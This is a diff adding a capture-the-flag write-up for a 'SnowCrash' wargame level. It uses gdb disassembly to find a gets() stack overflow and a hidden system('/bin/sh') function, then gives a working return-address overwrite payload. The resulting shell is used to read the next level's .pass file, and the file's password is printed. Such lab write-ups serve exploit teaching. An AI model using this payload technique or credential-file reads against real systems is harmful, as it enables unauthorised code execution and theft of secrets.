@@ -1,0 +1,49 @@
+(gdb) info func
+All defined functions:
+
+Non-debugging symbols:
+[...]
+0x08048444  run
+0x08048480  main
+[...]
+
+(gdb) disas run
+Dump of assembler code for function run:
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
+
+# The run function is calling system(/bin/sh), this is the function
+	we want to call
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:		push   %ebp
+   0x08048481 <+1>:		mov    %esp,%ebp
+   0x08048483 <+3>:		and    $0xfffffff0,%esp
+   0x08048486 <+6>:		sub    $0x50,%esp
+   0x08048489 <+9>:		lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leav
+   0x08048496 <+22>:	ret
+
+# The overflow occurs when calling the function gets, it can fills the
+	variable str with more than 76 char
+
+# The exploit occured but we instantly crashed, this is because cat is sending an EOF
+	so SH will be closed automatically
+level1@SnowCrash:~$ python -c 'print "a"*76+"\x6d\x84\x04\x08"' > /tmp/i
+level1@SnowCrash:~$ cat /tmp/i | ./level1
+Segmentation fault (core dumped)
+
+# From the cat manual: With no FILE, or when FILE is -, read standard input.
+	So we need to use - when catting so it wont send EOF (reading from STDIN)
+	And SH won't close
+
+level1@SnowCrash:~$ cat /tmp/i - | ./level1
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
